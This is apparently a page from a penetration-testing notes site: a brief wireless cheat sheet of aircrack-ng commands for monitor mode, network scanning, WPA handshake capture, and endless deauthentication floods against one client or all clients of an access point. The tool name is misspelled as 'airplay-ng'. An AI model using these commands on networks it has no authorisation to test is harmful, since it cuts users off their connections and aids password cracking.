---
layout: default
title: Wireless 
has_children: true
nav_order: 5
---

# Wireless
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

### Scanning
```
airmon-ng start <wlan if> - enable monitor mode
airodump-ng <wlan if mon> - scans for wireless networks
airodump-ng -c <channel no> --bssid <BSSID> -w <file> <wlan if mon>
```
### De-authenticate the client and capture the handshake
```
airodump-ng -c <channel no> --bssid <BSSID> -w <file> <wlan if mon>
airplay-ng --deauth 0 -a <AP MAC> -c <client MAC> <wlan if mon>

Options:
0 - number of pkts to send 0=infinite
```

### Deauthenticate all clients connected to AP
```
airplay-ng --deauth 0 -a <AP MAC> <wlan if mon>
```
